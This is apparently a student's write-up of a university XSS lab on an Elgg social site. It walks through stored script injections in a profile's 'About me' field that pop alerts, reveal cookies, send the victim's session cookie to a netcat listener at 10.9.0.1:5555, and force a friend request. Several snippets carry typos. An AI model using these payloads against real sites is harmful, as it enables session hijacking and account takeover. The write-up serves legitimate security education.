# TRABALHO REALIZADO NA SEMANA #10

## 3: Lab Tasks

### Task 1: Posting a Malicious Message to Display an Alert Window

>The objective of this task was to embed a javasript program which will execute when the page is loaded and will display an alter window with 'XSS'.
>
>To do this we will be using Alice as the attacker.
>
>First we will go to Alice's profile page and view the page source. Where we will find her GUID which is 56 (we just make a ctrl+f).
>
>>![week10_0](https://cdn.discordapp.com/attachments/903555414715670578/930966808696070224/unknown.png)
>
>We will use this info in order for the alert to not appear when it is Alice viewing her own profile.
>
>From that we can edit alice's profile, and conveniently for us we can edit the 'About me" section using html.\
>To inject the javascrip code we can use the html '&#60;script&#62;' with our code:
>
>>&#60;script&#62;\
>>&#8195;windows onload = function(){\
>>&#8195;&#8195;if (elgg.session.user.guit!= 56) {\
>>&#8195;&#8195;&#8195;alert('XSS');\
>>&#8195;&#8195;&#8195;}\
>>&#8195;&#8195;}\
>>&#60;/script&#62;
>
>We will add this code to her account:
>
>![week10_1](https://cdn.discordapp.com/attachments/903555414715670578/930949016714367076/unknown.png)
>
>If we then log into another account, lets say, for example, Samy. When we try to view Alice's profile page we get:
>
>![week10_2](https://cdn.discordapp.com/attachments/903555414715670578/930949137761992714/unknown.png)
>
>The attack was successful.

### Task 2: Posting a Malicious Message to Display Cookies

>Basically the task 2 was the same as the first one but with the appearance of the user's cookie.
>
>To do this we need to change the "About me" on the Alice's edit profile, on the "edit HTML" and write de comand in JS:
>
>>&#60;script&#62;\
>>&#8195;windows onload = function() {\
>>&#8195;&#8195;if (elgg.session.user.guit!= 56) {\
>>&#8195;&#8195;&#8195;alert(document.cookie);\
>>&#8195;&#8195;}\
>>&#8195;}\
>>&#60;/script&#62;
>
>>![week10_3](https://cdn.discordapp.com/attachments/903555414715670578/930949307614502982/unknown.png)
>
>If we then log into another account, lets say, for example, Samy. When we try to view Alice's profile page we get:
>
>>![week10_4](https://cdn.discordapp.com/attachments/903555414715670578/930949424635584513/unknown.png)
>
>The attack was successful.

### Task 3: Stealing Cookies from the Victim's Machine

>On this task the goal is to steal the cookies from someone who visits, in our case, Alice's page.
>
>We edited Alice's profile page 'About me' section to instead of having 'Alert(document.cookie)' have:
>
>>document.write('&#60;img src=http://10.9.0.1:5555?c='
&#43; escape(document.cookie) + ' &#62;');
>
>The '10.9.0.1' is the IP address of the machine while '5555' correspondes to the port location where script will send an HTTP GET to the machine.
>
>The code will be:
>
>>&#60;script&#62;\
>>&#8195;windows onload = function() {\
>>&#8195;&#8195;if (elgg.session.user.guit!= 56) {\
>>&#8195;&#8195;&#8195;document.write('&#60;img src=http://10.9.0.1:5555?c='
&#43; escape(document.cookie) + ' &#62;');\
>>&#8195;&#8195;}\
>>&#8195;}\
>>&#60;/script&#62;
>
>>![week10_5](https://cdn.discordapp.com/attachments/903555414715670578/930956473574490112/unknown.png)
>
>The next step was to open terminal and to use the command 'nc -lknv 5555' which will allow us to see what we are able to steal. (This server program basically prints out whatever is sent by the client and sends to the client whatever is typed by the user running the server.)
>
>When we log in with Samy's account and try to visit Alice's profile we will be redirected to a blank page (trying to load the supposed "image" from our code). But what actually happens is that out terminal will have logged his info: 
>
>
>![week10_7](https://media.discordapp.net/attachments/903555414715670578/930956662804713492/unknown.png?width=1376&height=702)
>
>This task was also successful and Alice now has Samy's session cookie.

### Task 4: Becoming the Victim’s Friend

>On this task we simulated a request HTML with JS.
>
>The objective was to simulate an "add friend" request without doing a click on the button.
>
>So we basically need to write JS in the "About Me" section of the Samy:
>
>>![week_8](https://cdn.discordapp.com/attachments/903555414715670578/930962003831439390/unknown.png)
>
>And on the section "sendurl = ...;" we putted the URL of that request.
>
>We adquire that by logging in as Alice, access to Network tab with inspect the page and add Samy as a friend. We've got an GET of that and copied the URL of that.
>
>Now if we enter the Samy's profile, us being Alice, without pressing the "Add Friend" button, this was already pressed.
>
>>![week10_9](https://cdn.discordapp.com/attachments/903555414715670578/930963121818959872/unknown.png)
>>
>>![week10_10](https://cdn.discordapp.com/attachments/903555414715670578/930963266757341254/unknown.png)
>
>The attack was successful.
